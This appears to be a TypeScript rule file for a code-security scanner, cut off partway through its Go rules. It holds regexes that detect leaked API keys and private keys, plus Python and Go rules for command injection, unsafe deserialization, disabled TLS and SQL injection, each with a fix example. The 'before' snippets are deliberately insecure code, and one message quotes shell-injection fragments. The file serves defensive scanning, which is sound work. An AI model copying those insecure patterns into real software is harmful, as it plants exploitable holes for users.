import {
  callArgsAt,
  findClose,
  functionBodyAfter,
  isDiscardedExpression,
  looksLikeSecretValue,
  looksLikePlaceholder,
  shannonEntropy,
  statementEnd,
  type CheckFinding,
  type FileCtx,
  type FileRole,
  type PatternRule,
  type Refinement,
  type RuleMatch,
  type Severity,
  type SinkRule,
  type StructuralCheck,
} from "@/lib/internal-ai-engine";

const ALL_ROLES: FileRole[] = ["source", "test", "fixture"];
const SOURCE_AND_FIXTURE: FileRole[] = ["source", "fixture"];

const SEC_CONTEXT = /passw|secret|token|nonce|salt|otp|csrf|session|api[_-]?key|credential|reset|verif|invite|signature|hmac|\bauth|cookie/i;

const SQL_KEYWORDS =
  /\b(?:select\s[\s\S]{0,400}?\bfrom|insert\s+into|update\s+[\w."`]+\s+set|delete\s+from|drop\s+table|alter\s+table|create\s+table|union\s+select)\b|\bwhere\s+[\w."`]+\s*(?:=|<|>|like|in\b)/i;

function around(m: RuleMatch, before = 2, after = 2): string {
  const out: string[] = [];
  const last = Math.min(m.ctx.lines.count, m.aline + after);
  for (let l = Math.max(1, m.aline - before); l <= last; l++) out.push(m.ctx.lines.lineText(l));
  return out.join("\n");
}

function callOf(m: RuleMatch): { code: string; text: string; args: string[] } | null {
  const call = callArgsAt(m.ctx.code, m.end - 1);
  if (!call) return null;
  return {
    code: m.ctx.code.slice(call.open + 1, call.close),
    text: m.ctx.text.slice(call.open + 1, call.close),
    args: call.args.map((a) => a.text),
  };
}

function literalOnly(code: string): boolean {
  return /^[\s"'`+,fbrFBR]*$/.test(code);
}

function downgrade(sev: Severity): Severity {
  return sev === "critical" ? "high" : sev === "high" ? "medium" : "low";
}

function roleAdjusted(m: RuleMatch, sev: Severity): true | Refinement {
  return m.ctx.role === "source" ? true : { severity: downgrade(sev), confidence: 0.7 };
}

function contextual(m: RuleMatch, hot: Severity, cold: Severity | false): boolean | Refinement {
  if (SEC_CONTEXT.test(around(m))) return { severity: hot };
  return cold === false ? false : { severity: cold, confidence: 0.5 };
}

const SECRET_SUGGESTION =
  "Revoke and rotate this credential in the provider's dashboard now — deleting it from the code does not un-leak it (it stays in git history and every clone). Load it from an environment variable or a secrets manager, and enable secret scanning / push protection (GitHub, gitleaks) so it can't be committed again.";

interface ProviderToken {
  slug: string;
  name: string;
  re: RegExp;
  severity: Severity;
  roles?: FileRole[];
}

const PROVIDER_TOKENS: ProviderToken[] = [
  { slug: "aws", name: "AWS access key ID", re: /\b(?:AKIA|ASIA|ABIA|ACCA)[0-9A-Z]{16}\b/g, severity: "critical" },
  { slug: "github", name: "GitHub token", re: /\b(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36,}\b/g, severity: "critical" },
  { slug: "github-pat", name: "GitHub fine-grained token", re: /\bgithub_pat_[A-Za-z0-9_]{50,}\b/g, severity: "critical" },
  { slug: "gitlab", name: "GitLab token", re: /\bglpat-[A-Za-z0-9_-]{20,}\b/g, severity: "critical" },
  { slug: "slack", name: "Slack token", re: /\bxox[abposr]-[A-Za-z0-9-]{10,}\b/g, severity: "critical" },
  { slug: "slack-webhook", name: "Slack webhook URL", re: /https:\/\/hooks\.slack\.com\/services\/T[A-Z0-9]+\/B[A-Z0-9]+\/[A-Za-z0-9]{16,}/g, severity: "high" },
  { slug: "discord-webhook", name: "Discord webhook URL", re: /https:\/\/(?:ptb\.|canary\.)?discord(?:app)?\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]{40,}/g, severity: "high" },
  { slug: "stripe-live", name: "Stripe live secret key", re: /\b(?:sk|rk)_live_[A-Za-z0-9]{20,}\b/g, severity: "critical" },
  { slug: "stripe-test", name: "Stripe test secret key", re: /\bsk_test_[A-Za-z0-9]{20,}\b/g, severity: "medium" },
  { slug: "anthropic", name: "Anthropic API key", re: /\bsk-ant-(?:api|admin)\d{2}-[A-Za-z0-9_-]{40,}/g, severity: "critical" },
  { slug: "openai", name: "OpenAI API key", re: /\bsk-(?:proj|svcacct|admin)-[A-Za-z0-9_-]{40,}|\bsk-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20}\b/g, severity: "critical" },
  { slug: "google", name: "Google API key", re: /\bAIza[0-9A-Za-z_-]{35}\b/g, severity: "high" },
  { slug: "google-oauth", name: "Google OAuth client secret", re: /\bGOCSPX-[A-Za-z0-9_-]{28}\b/g, severity: "critical" },
  { slug: "sendgrid", name: "SendGrid API key", re: /\bSG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}\b/g, severity: "critical" },
  { slug: "npm", name: "npm access token", re: /\bnpm_[A-Za-z0-9]{36}\b/g, severity: "critical" },
  { slug: "pypi", name: "PyPI upload token", re: /\bpypi-AgEIcHlwaS5vcmc[A-Za-z0-9_-]{50,}/g, severity: "critical" },
  { slug: "huggingface", name: "Hugging Face token", re: /\bhf_[A-Za-z0-9]{34,}\b/g, severity: "high" },
  { slug: "groq", name: "Groq API key", re: /\bgsk_[A-Za-z0-9]{48,}\b/g, severity: "critical" },
  { slug: "xai", name: "xAI API key", re: /\bxai-[A-Za-z0-9]{60,}\b/g, severity: "critical" },
  { slug: "shopify", name: "Shopify access token", re: /\bshp(?:at|ss|ca|pa)_[a-fA-F0-9]{32}\b/g, severity: "critical" },
  { slug: "digitalocean", name: "DigitalOcean token", re: /\bdo[op]_v1_[a-f0-9]{64}\b/g, severity: "critical" },
  { slug: "telegram", name: "Telegram bot token", re: /\b\d{8,10}:AA[A-Za-z0-9_-]{33}\b/g, severity: "high" },
  { slug: "mailgun", name: "Mailgun API key", re: /\bkey-[0-9a-f]{32}\b/g, severity: "high" },
  { slug: "square", name: "Square access token", re: /\bEAAA[A-Za-z0-9_-]{60}\b/g, severity: "critical" },
  { slug: "age", name: "age encryption secret key", re: /\bAGE-SECRET-KEY-1[0-9A-Z]{58}\b/g, severity: "critical" },
  { slug: "jwt", name: "Hardcoded JWT", re: /\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{20,}/g, severity: "medium", roles: ["source"] },
];

const FAKE_TOKEN = /EXAMPLE|example|XXXX|xxxx|0000000|1234567|abcdefgh|ABCDEFGH|your|dummy|fake|sample|placeholder|redacted|REDACTED/;

const PROVIDER_RULES: PatternRule[] = PROVIDER_TOKENS.map((t) => ({
  id: `hardcoded-secret-${t.slug}`,
  category: "security",
  severity: t.severity,
  confidence: 0.95,
  langs: "any",
  view: "text",
  roles: t.roles ?? ALL_ROLES,
  cls: "secret",
  pattern: t.re,
  inStrings: true,
  refine: (m) => {
    if (FAKE_TOKEN.test(m.text) || shannonEntropy(m.text) < 3.2) return false;
    return roleAdjusted(m, t.severity);
  },
  message: (m) =>
    `${t.name} committed in ${m.ctx.short}. Anyone with read access to the repository — including every fork and clone — can use it.`,
  suggestion: SECRET_SUGGESTION,
  fix: {
    before: `const client = new Client({ apiKey: "${t.slug === "aws" ? "AKIA…" : "sk_live_…"}" });`,
    after: `const client = new Client({ apiKey: process.env.${t.slug.toUpperCase().replace(/-/g, "_")}_API_KEY });\n// .env (never committed): ${t.slug.toUpperCase().replace(/-/g, "_")}_API_KEY=…`,
    language: "typescript",
  },
}));

const GENERIC_SECRET_KEY_EXCLUDE =
  /(?:url|uri|endpoint|path|name|field|label|placeholder|message|msg|error|type|header|id|length|min|max|regex|pattern|hint|title|text|prefix|suffix|format|policy|expir\w*|count|hash|salt|param|query|column|table|env|var|input|strength|rules?|schema|route|page|link|button|confirm\w*|reset\w*|visible|enabled)$/i;

export const SECRET_RULES: PatternRule[] = [
  ...PROVIDER_RULES,
  {
    id: "hardcoded-pem-key",
    category: "security",
    severity: "critical",
    confidence: 0.97,
    langs: "any",
    view: "text",
    roles: ALL_ROLES,
    cls: "secret",
    pattern: /-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP |ENCRYPTED )?PRIVATE KEY(?: BLOCK)?-----/g,
    inStrings: true,
    refine: (m) =>
      /^(?:\\n|\\r|[\s"'`+,])*[A-Za-z0-9+/=]{40,}/.test(m.ctx.text.slice(m.end, m.end + 300)) && roleAdjusted(m, "critical"),
    message: (m) => `PEM-encoded private key committed in ${m.ctx.short}. Private keys in source control are immediately exploitable.`,
    suggestion: "Revoke and regenerate the key pair. Store private keys only in a secrets manager or environment variable (escape newlines as \\n).",
    fix: {
      before: "const privateKey = `-----BEGIN RSA PRIVATE KEY-----\\nMIIEowIBAAKCAQEA...`;",
      after: 'const privateKey = process.env.PRIVATE_KEY?.replace(/\\\\n/g, "\\n");',
      language: "typescript",
    },
  },
  {
    id: "hardcoded-secret-generic",
    category: "security",
    severity: "critical",
    confidence: 0.8,
    langs: "any",
    view: "text",
    cls: "secret",
    pattern:
      /(?<![\w$])["']?([\w.$-]{0,40}?(?:password|passwd|pwd|secret|api[_-]?key|apikey|access[_-]?key|auth[_-]?token|access[_-]?token|refresh[_-]?token|client[_-]?secret|private[_-]?key|signing[_-]?key|encryption[_-]?key|token)\w{0,30})["']?\s*(?::=|=>|[:=])\s*(["'`])([^"'`\s]{6,200})\2/gi,
    refine: (m) => {
      const key = m.groups[0] ?? "";
      const value = m.groups[2] ?? "";
      if (GENERIC_SECRET_KEY_EXCLUDE.test(key) || /^(?:on|is|has|should|show|use|set|get|validate)[A-Z_]/.test(key)) return false;
      if (!looksLikeSecretValue(value, key)) return false;
      return /pass(?:word|wd)?|pwd/i.test(key) ? { severity: "high", confidence: 0.75 } : true;
    },
    message: (m) =>
      `Hardcoded credential \`${m.groups[0]}\` in ${m.ctx.short}. Secrets in source code are visible to anyone who can read the repository and persist in git history.`,
    suggestion: "Move the value to an environment variable or secrets manager and rotate the exposed credential. Never commit real credentials, even temporarily.",
    fix: {
      before: 'const config = {\n  apiKey: "sk-live-abc123secretkey",\n  dbPassword: "myP@ssw0rd!",\n};',
      after: "const config = {\n  apiKey: process.env.API_KEY,\n  dbPassword: process.env.DB_PASSWORD,\n};\n// Document the names (no values) in .env.example",
      language: "typescript",
    },
  },
  {
    id: "env-fallback-secret",
    category: "security",
    severity: "high",
    confidence: 0.85,
    langs: ["js", "py"],
    view: "text",
    cls: "secret",
    pattern:
      /\b(?:process\.env|import\.meta\.env)\.([A-Z0-9_]*(?:SECRET|PASSWORD|PRIVATE_KEY|SIGNING_KEY|ENCRYPTION_KEY)[A-Z0-9_]*)\s*(?:\?\?|\|\|)\s*["'`]([^"'`]{4,})["'`]|\b(?:os\.environ\.get|os\.getenv)\s*\(\s*["']([A-Z0-9_]*(?:SECRET|PASSWORD|PRIVATE_KEY|SIGNING_KEY|ENCRYPTION_KEY)[A-Z0-9_]*)["']\s*,\s*["']([^"']{4,})["']/g,
    message: (m) =>
      `\`${m.groups[0] ?? m.groups[2]}\` falls back to a hardcoded value in ${m.ctx.short}. If the variable is ever missing in production, the app silently runs with a secret that is public in the source code (forgeable sessions, tokens or signatures).`,
    suggestion: "Fail fast instead of falling back: throw at startup when the secret is missing. Use defaults only for non-secret configuration.",
    fix: {
      before: 'const secret = process.env.JWT_SECRET ?? "dev-secret";',
      after: 'const secret = process.env.JWT_SECRET;\nif (!secret) throw new Error("JWT_SECRET is not set");',
      language: "typescript",
    },
  },
  {
    id: "env-file-secret",
    category: "security",
    severity: "critical",
    confidence: 0.85,
    langs: ["env"],
    view: "raw",
    roles: SOURCE_AND_FIXTURE,
    cls: "secret",
    pattern:
      /^[ \t]*(?:export\s+)?([A-Z0-9_]*(?:SECRET|PASSWORD|PASSWD|TOKEN|API_?KEY|PRIVATE_KEY|ACCESS_KEY|CLIENT_SECRET|DATABASE_URL|DB_URL|CONNECTION_STRING)[A-Z0-9_]*)[ \t]*=[ \t]*["']?([^\s"'#]+)/gm,
    refine: (m) => {
      const key = m.groups[0] ?? "";
      const value = m.groups[1] ?? "";
      if (/URL|CONNECTION/.test(key)) {
        const pw = /:\/\/[^:/@\s]+:([^@/\s]+)@([^/:\s]+)/.exec(value);
        if (!pw || looksLikePlaceholder(pw[1]) || /^(?:localhost|127\.0\.0\.1|0\.0\.0\.0|db|postgres|mysql|redis|mongo)$/.test(pw[2])) return false;
      } else if (!looksLikeSecretValue(value, key)) {
        return false;
      }
      return m.ctx.role === "source" ? true : { severity: "high", confidence: 0.75 };
    },
    message: (m) =>
      m.ctx.role === "source"
        ? `Real-looking value for \`${m.groups[0]}\` in committed env file ${m.ctx.short}. Env files with real secrets must never be committed.`
        : `Real-looking value for \`${m.groups[0]}\` in example env file ${m.ctx.short}. Example files should hold placeholders only — this looks like a live credential.`,
    suggestion: "Rotate the credential, replace the value with a placeholder, and make sure .env / .env.local are in .gitignore.",
  },
  {
    id: "yaml-hardcoded-secret",
    category: "security",
    severity: "high",
    confidence: 0.75,
    langs: ["yaml"],
    view: "text",
    cls: "secret",
    pattern:
      /^[ \t]*-?[ \t]*["']?([A-Za-z0-9_]*(?:PASSWORD|PASSWD|SECRET|TOKEN|API_?KEY|PRIVATE_KEY|ACCESS_KEY)[A-Za-z0-9_]*)["']?[ \t]*[:=][ \t]*["']?([^\s"'#]{6,})/gim,
    refine: (m) => {
      const value = m.groups[1] ?? "";
      if (/[${}]|secretKeyRef|valueFrom|^\*/.test(value)) return false;
      if (/^(?:postgres|mysql|mongo|redis|root|admin|password|secret|example|test|dev\w*|local\w*)$/i.test(value)) {
        return { severity: "low", confidence: 0.5 };
      }
      return looksLikeSecretValue(value, m.groups[0]);
    },
    message: (m) => `Hardcoded \`${m.groups[0]}\` in ${m.ctx.short}. Config files are committed and shared — inline secrets leak with them.`,
    suggestion: "Reference secrets instead of inlining them: ${{ secrets.NAME }} in GitHub Actions, env_file / Docker secrets in Compose, secretKeyRef in Kubernetes.",
  },
  {
    id: "public-env-secret",
    category: "security",
    severity: "high",
    confidence: 0.85,
    langs: "any",
    view: "text",
    roles: SOURCE_AND_FIXTURE,
    cls: "secret-exposure",
    pattern:
      /\b(?:NEXT_PUBLIC|VITE|REACT_APP|EXPO_PUBLIC|NUXT_PUBLIC|GATSBY|PUBLIC)_[A-Z0-9_]*?(?:SECRET|PRIVATE_KEY|PASSWORD|PASSWD|SERVICE_ROLE|SERVICE_KEY|DATABASE_URL|DB_URL|DB_PASS\w*|OPENAI_API_KEY|ANTHROPIC_API_KEY|STRIPE_SK|SK_LIVE)[A-Z0-9_]*\b/g,
    message: (m) =>
      `\`${m.text}\` in ${m.ctx.short} uses a public env prefix for a secret. Bundlers inline every NEXT_PUBLIC_/VITE_/REACT_APP_ variable into client JavaScript, so this value ships to every visitor's browser.`,
    suggestion: "Drop the public prefix and only read the secret on the server (API route, server action, server component). Rotate the value if it has ever been deployed.",
    fix: {
      before: "const supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY!);",
      after: "// Server-only module:\nimport \"server-only\";\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY!);",
      language: "typescript",
    },
  },
];

const PY_RULES: PatternRule[] = [
  {
    id: "py-subprocess-shell",
    category: "security",
    severity: "high",
    confidence: 0.8,
    langs: ["py"],
    view: "code",
    cls: "cmdi",
    pattern: /\bsubprocess\s*\.\s*(?:run|call|check_call|check_output|Popen)\s*\(/g,
    refine: (m) => {
      const c = callOf(m);
      return !!c && /\bshell\s*=\s*True\b/.test(c.code) && !literalOnly(c.args[0] ?? "");
    },
    message: (m) => `subprocess call with \`shell=True\` and a dynamic command in ${m.ctx.short}. Any user-influenced part of the string becomes shell syntax (\`; rm -rf\`, \`$(…)\`).`,
    suggestion: "Pass an argument list and drop shell=True: subprocess.run([\"git\", \"clone\", url], check=True). If a shell is unavoidable, quote every value with shlex.quote().",
    fix: {
      before: 'subprocess.run(f"git clone {url}", shell=True)',
      after: 'subprocess.run(["git", "clone", "--", url], check=True)',
      language: "python",
    },
  },
  {
    id: "py-os-system",
    category: "security",
    severity: "high",
    confidence: 0.75,
    langs: ["py"],
    view: "code",
    cls: "cmdi",
    pattern: /\bos\s*\.\s*(?:system|popen)\s*\(/g,
    refine: (m) => !literalOnly(callOf(m)?.code ?? ""),
    message: (m) => `os.system/os.popen with a dynamic command in ${m.ctx.short}. The string is run by the shell, so injected metacharacters execute.`,
    suggestion: "Use subprocess.run([...], check=True) with an argument list instead of a shell string.",
  },
  {
    id: "py-eval-exec",
    category: "security",
    severity: "high",
    confidence: 0.8,
    langs: ["py"],
    view: "code",
    cls: "code",
    pattern: /(?<![.\w])(?:eval|exec)\s*\(/g,
    refine: (m) => !literalOnly(callOf(m)?.code ?? ""),
    message: (m) => `eval()/exec() on a dynamic value in ${m.ctx.short}. Executing strings is remote code execution if any part is user-influenced.`,
    suggestion: "Use ast.literal_eval() for literals, json.loads() for data, or an explicit dispatch table for behaviour.",
  },
  {
    id: "py-unsafe-deserialization",
    category: "security",
    severity: "high",
    confidence: 0.8,
    langs: ["py"],
    view: "code",
    cls: "deser",
    pattern: /\b(?:pickle|cPickle|dill|marshal|jsonpickle)\s*\.\s*(?:loads?|decode)\s*\(|\bshelve\s*\.\s*open\s*\(/g,
    message: (m) => `Unsafe deserialization (${m.text.replace(/\s+/g, "").replace(/\($/, "")}) in ${m.ctx.short}. Unpickling attacker-controlled bytes executes arbitrary code.`,
    suggestion: "Only unpickle data you produced and signed. For data exchange use json, or msgpack with a schema.",
  },
  {
    id: "py-yaml-load",
    category: "security",
    severity: "high",
    confidence: 0.85,
    langs: ["py"],
    view: "code",
    cls: "deser",
    pattern: /\byaml\s*\.\s*(?:load|load_all|unsafe_load|full_load)\s*\(/g,
    refine: (m) => /unsafe_load|full_load/.test(m.text) || !/SafeLoader|CSafeLoader|BaseLoader/.test(callOf(m)?.code ?? ""),
    message: (m) => `yaml.load without SafeLoader in ${m.ctx.short}. PyYAML's full loader can construct arbitrary Python objects from YAML tags.`,
    suggestion: "Use yaml.safe_load(stream), or yaml.load(stream, Loader=yaml.SafeLoader).",
    fix: { before: "config = yaml.load(f)", after: "config = yaml.safe_load(f)", language: "python" },
  },
  {
    id: "py-tls-verify-disabled",
    category: "security",
    severity: "high",
    confidence: 0.9,
    langs: ["py"],
    view: "code",
    cls: "tls",
    pattern: /\bverify\s*=\s*False\b|\bssl\s*\.\s*_create_unverified_context\s*\(|\bCERT_NONE\b/g,
    message: (m) => `TLS certificate verification disabled in ${m.ctx.short}. Any network attacker can impersonate the server and read or modify the traffic.`,
    suggestion: "Remove verify=False. For a private CA, pass verify=\"/path/to/ca-bundle.pem\" instead.",
  },
  {
    id: "py-debug-enabled",
    category: "security",
    severity: "high",
    confidence: 0.8,
    langs: ["py"],
    view: "code",
    cls: "debug",
    pattern: /^\s*DEBUG\s*=\s*True\b|\.\s*run\s*\([^)\n]*\bdebug\s*=\s*True/gm,
    refine: (m) => !/^\s*DEBUG/.test(m.text) || /settings|config/i.test(m.ctx.filename),
    message: (m) =>
      /run/.test(m.text)
        ? `Flask app started with debug=True in ${m.ctx.short}. The Werkzeug debugger allows arbitrary code execution from the browser.`
        : `DEBUG = True in ${m.ctx.short}. Django debug pages leak settings, SQL and stack traces to anyone who triggers an error.`,
    suggestion: "Read debug flags from the environment and default to off: DEBUG = os.environ.get(\"DJANGO_DEBUG\") == \"1\".",
  },
  {
    id: "py-sql-string-building",
    category: "security",
    severity: "high",
    confidence: 0.85,
    langs: ["py"],
    view: "text",
    cls: "sqli",
    pattern:
      /\.\s*(?:execute|executemany|executescript|raw|extra)\s*\(\s*(?:f["']|["'][^"'\n]*["']\s*(?:%|\.\s*format\s*\(|\+))|\btext\s*\(\s*f["']/g,
    refine: (m) => SQL_KEYWORDS.test(m.ctx.text.slice(m.index, m.index + 400)),
    message: (m) => `SQL built with string formatting in ${m.ctx.short}. f-strings, % and .format() splice values into the query text — classic SQL injection.`,
    suggestion: "Use driver parameters: cursor.execute(\"SELECT * FROM users WHERE id = %s\", (user_id,)). With SQLAlchemy: text(\"… WHERE id = :id\").bindparams(id=user_id).",
    fix: {
      before: 'cursor.execute(f"SELECT * FROM users WHERE email = \'{email}\'")',
      after: 'cursor.execute("SELECT * FROM users WHERE email = %s", (email,))',
      language: "python",
    },
  },
  {
    id: "py-weak-hash",
    category: "security",
    severity: "medium",
    confidence: 0.8,
    langs: ["py"],
    view: "code",
    cls: "crypto",
    pattern: /\bhashlib\s*\.\s*(?:md5|sha1)\s*\(/g,
    refine: (m) => (/usedforsecurity\s*=\s*False/.test(callOf(m)?.code ?? "") ? false : contextual(m, "high", "low")),
    message: (m) => `${/md5/.test(m.text) ? "MD5" : "SHA-1"} used in ${m.ctx.short}. Both are broken for security purposes (collisions; fast to brute-force).`,
    suggestion: "Use hashlib.sha256 for integrity, hmac with SHA-256 for signatures, and bcrypt/argon2/scrypt for passwords. If this is a non-security checksum, pass usedforsecurity=False.",
  },
  {
    id: "py-insecure-random",
    category: "security",
    severity: "medium",
    confidence: 0.8,
    langs: ["py"],
    view: "code",
    cls: "random",
    pattern: /\brandom\s*\.\s*(?:random|randint|choice|choices|randrange|getrandbits|sample)\s*\(/g,
    refine: (m) => contextual(m, "medium", false),
    message: (m) => `\`random\` module used for a security-sensitive value in ${m.ctx.short}. Its output is predictable (Mersenne Twister).`,
    suggestion: "Use the secrets module: secrets.token_urlsafe(32), secrets.choice(alphabet).",
  },
  {
    id: "py-jwt-no-verify",
    category: "security",
    severity: "critical",
    confidence: 0.9,
    langs: ["py"],
    view: "text",
    cls: "auth",
    pattern: /\bjwt\s*\.\s*decode\s*\(/g,
    refine: (m) => /verify\s*=\s*False|["']verify_signature["']\s*:\s*False|algorithms\s*=\s*\[[^\]]*["']none["']/i.test(callOf(m)?.text ?? ""),
    message: (m) => `JWT decoded without signature verification in ${m.ctx.short}. Anyone can forge a token with arbitrary claims.`,
    suggestion: "Always verify: jwt.decode(token, key, algorithms=[\"HS256\"]). Never disable verify_signature.",
  },
  {
    id: "py-tempfile-mktemp",
    category: "security",
    severity: "medium",
    confidence: 0.9,
    langs: ["py"],
    view: "code",
    pattern: /\btempfile\s*\.\s*mktemp\s*\(/g,
    message: (m) => `tempfile.mktemp() in ${m.ctx.short} returns a name that another process can claim before you create it (race condition).`,
    suggestion: "Use tempfile.NamedTemporaryFile() or tempfile.mkstemp(), which create the file atomically.",
  },
  {
    id: "py-allowed-hosts-wildcard",
    category: "security",
    severity: "medium",
    confidence: 0.85,
    langs: ["py"],
    view: "text",
    pattern: /\bALLOWED_HOSTS\s*=\s*\[\s*["']\*["']|\bCORS_(?:ORIGIN_ALLOW_ALL|ALLOW_ALL_ORIGINS)\s*=\s*True/g,
    message: (m) =>
      /CORS/.test(m.text)
        ? `CORS allows every origin in ${m.ctx.short}.`
        : `ALLOWED_HOSTS = ["*"] in ${m.ctx.short} disables Django's Host header validation (cache poisoning, password-reset link poisoning).`,
    suggestion: "List the exact hostnames/origins you serve, loaded from the environment per deployment.",
  },
  {
    id: "py-xml-unsafe",
    category: "security",
    severity: "low",
    confidence: 0.6,
    langs: ["py"],
    view: "code",
    cls: "xxe",
    pattern: /\b(?:ElementTree|etree|minidom|pulldom|sax|expat)\s*\.\s*(?:parse|fromstring|parseString|XMLParser|iterparse)\s*\(|\bresolve_entities\s*=\s*True/g,
    refine: (m) => (/resolve_entities/.test(m.text) ? { severity: "high", confidence: 0.85 } : !/defusedxml/.test(m.ctx.raw)),
    message: (m) => `XML parsed with the standard library in ${m.ctx.short}. It is vulnerable to entity-expansion (billion laughs) and, with lxml + resolve_entities, XXE.`,
    suggestion: "Parse untrusted XML with defusedxml (drop-in: from defusedxml.ElementTree import fromstring).",
  },
  {
    id: "py-requests-no-timeout",
    category: "performance",
    severity: "medium",
    confidence: 0.8,
    langs: ["py"],
    view: "code",
    pattern: /\brequests\s*\.\s*(?:get|post|put|patch|delete|head|options|request)\s*\(/g,
    refine: (m) => !/\btimeout\s*=/.test(callOf(m)?.code ?? "timeout="),
    message: (m) => `HTTP request without a timeout in ${m.ctx.short}. requests waits forever by default — one slow upstream hangs the worker.`,
    label: "HTTP requests without a timeout — workers hang on slow upstreams",
    suggestion: "Always pass timeout=(connect, read), e.g. requests.get(url, timeout=(3.05, 10)).",
  },
  {
    id: "py-except-pass",
    category: "quality",
    severity: "medium",
    confidence: 0.85,
    langs: ["py"],
    view: "code",
    pattern: /\bexcept\b[^:\n]*:\s*\n\s*pass\b/g,
    message: (m) => `Exception swallowed with \`except: pass\` in ${m.ctx.short}. Failures disappear without a trace.`,
    label: "Exceptions swallowed with except: pass",
    suggestion: "Catch the narrowest exception type and log it (logger.exception(...)) or re-raise with context.",
  },
  {
    id: "py-bare-except",
    category: "quality",
    severity: "low",
    confidence: 0.9,
    langs: ["py"],
    view: "code",
    pattern: /^\s*except\s*:/gm,
    message: (m) => `Bare \`except:\` in ${m.ctx.short} also catches KeyboardInterrupt and SystemExit.`,
    label: "Bare except: clauses catch SystemExit/KeyboardInterrupt",
    suggestion: "Catch Exception (or a narrower type) instead of everything.",
  },
  {
    id: "py-mutable-default-arg",
    category: "quality",
    severity: "medium",
    confidence: 0.9,
    langs: ["py"],
    view: "code",
    pattern: /\bdef\s+\w+\s*\([^)]*=\s*(?:\[\s*\]|\{\s*\}|set\s*\(\s*\)|list\s*\(\s*\)|dict\s*\(\s*\))/g,
    message: (m) => `Mutable default argument in ${m.ctx.short}. The same list/dict is shared across every call, so state leaks between calls.`,
    label: "Mutable default arguments shared across calls",
    suggestion: "Default to None and create the object inside: def f(items=None): items = items or [].",
    fix: { before: "def add(item, items=[]):\n    items.append(item)", after: "def add(item, items=None):\n    items = [] if items is None else items\n    items.append(item)", language: "python" },
  },
];

const GO_RULES: PatternRule[] = [
  {
    id: "go-tls-insecure",
    category: "security",
    severity: "critical",
    confidence: 0.95,
    langs: ["go"],
    view: "code",
    cls: "tls",
    pattern: /\bInsecureSkipVerify\s*:\s*true\b/g,
    message: (m) => `InsecureSkipVerify: true in ${m.ctx.short}. TLS certificates are not checked, so any network attacker can intercept the connection.`,
    suggestion: "Remove InsecureSkipVerify. For a private CA, load it into tls.Config{RootCAs: pool}.",
  },
  {
    id: "go-sql-string-building",
    category: "security",
    severity: "high",
    confidence: 0.85,
    langs: ["go"],
    view: "code",
    cls: "sqli",
    pattern: /\.\s*(?:Query|QueryRow|Exec|QueryContext|ExecContext|QueryRowContext|Prepare|PrepareContext|Get|Select)\s*\(/g,
    refine: (m) => {
      const c = callOf(m);
      return !!c && /\bfmt\s*\.\s*Sprintf\s*\(|"\s*\+\s*\w|\w\s*\+\s*"/.test(c.code) && SQL_KEYWORDS.test(c.text);
    },
    message: (m) => `SQL assembled with fmt.Sprintf/concatenation in ${m.ctx.short}. Values spliced into the query text allow SQL injection.`,
    suggestion: "Use placeholders and pass values separately: db.Query(\"SELECT * FROM users WHERE id = $1\", id).",
    fix: {
      before: 'rows, err := db.Query(fmt.Sprintf("SELECT * FROM users WHERE id = %s", id))',
      after: 'rows, err := db.Query("SELECT * FROM users WHERE id = $1", id)',
      language: "go",
    },
  },
  {
    id: "go-shell-command",
    category: "security",
    severity: "high",
    confidence: 0.8,
    langs: ["go"],
    view: "text",
    cls: "cmdi",
    pattern: /\bexec\s*\.\s*Command(?:Context)?\s*\(/g,
    refine: (m) => {
      const c = callOf(m);
      return !!c && /"(?:sh|bash|zsh|\/bin\/sh|\/bin\/bash|cmd|cmd\.exe|powershell)"\s*,\s*"(?:-c|\/c|-Command)"/.test(c.text) && !literalOnly(c.code.replace(/^[^,]*,[^,]*,/, ""));
    },
    message: (m) => `Shell invoked with a dynamic command string in ${m.ctx.short}. Anything interpolated into the string is executed as shell syntax.`,
    suggestion: "Call the program directly with separate arguments: exec.Command(\"git\", \"clone\", \"--\", url).",
  },
  {
    id: "go-weak-crypto",
    category: "security",
    severity: "medium",
    confidence: 0.8,
    langs: ["go"],
    view: "code",
    cls: "crypto",
    pattern: /\b(?:md5|sha1)\s*\.\s*(?:New|Sum)\s*\(|\b(?:des|rc4)\s*\.\s*New\w*\s*\(/g,
    refine: (m) => (/des|rc4/.test(m.text) ? { severity: "high" } : contextual(m, "high", "low")),
    message: (m) => `Weak primitive (${m.text.split(".")[0].trim()}) in ${m.ctx.short}. MD5/SHA-1/DES/RC4 are broken for security use.`,
    suggestion: "Use crypto/sha256 for integrity, crypto/hmac for signatures, AES-GCM for encryption and bcrypt/argon2 for passwords.",
  },
  {
    id: "go-math-rand-security",
    category: "security",
    severity: "medium",
    confidence: 0.75,
    langs: ["go"],
    view: "code",
    cls: "random",
    pattern: /\brand\s*\.\s*(?:Int|Intn|Int31|Int63|Uint32|Uint64|Float64|Read|Perm)\w*\s*\(/g,
    refine: (m) => /"math\/rand(?:\/v2)?"/.test(m.ctx.text) && !/"crypto\/rand"/.test(m.ctx.text) && contextual(m, "medium", false),
    message: (m) => `math/rand used for a security-sensitive value in ${m.ctx.short}. It is deterministic and predictable.`,
    suggestion: "Use crypto/rand (rand.Read / rand.Text in Go 1.24+) for tokens, keys and nonces.",
  },
  {
    id: "go-http-no-timeouts",
    category: "security",
    severity: "medium",
    confidence: 0.75,
    langs: ["go"],
    view: "code",
    pattern: /\bhttp\s*\.\s*ListenAndServe(?:TLS)?\s*\(/g,
    message: (m) => `http.ListenAndServe in ${m.ctx.short} uses a server with no read/write timeouts — slow clients can exhaust connections (Slowloris).`,
    suggestion: "Construct an http.Server with ReadHeaderTimeout, ReadTimeout, WriteTimeout and IdleTimeout, then call srv.ListenAndServe().",
  },
  {
    id: "go-empty-error-check",
    category: "quality",
    severity: "medium",
    confidence: 0.9,
    langs: ["go"],
    view: "code",
    pattern: /\bif\s+err\s*!=\s*nil\s*\{\s*\}/g,
    message: (m) => `Empty \`if err != nil {}\` in ${m.ctx.short} — the error is detected and then ignored.`,
    label: "Errors checked and then ignored (empty if err != nil {})",
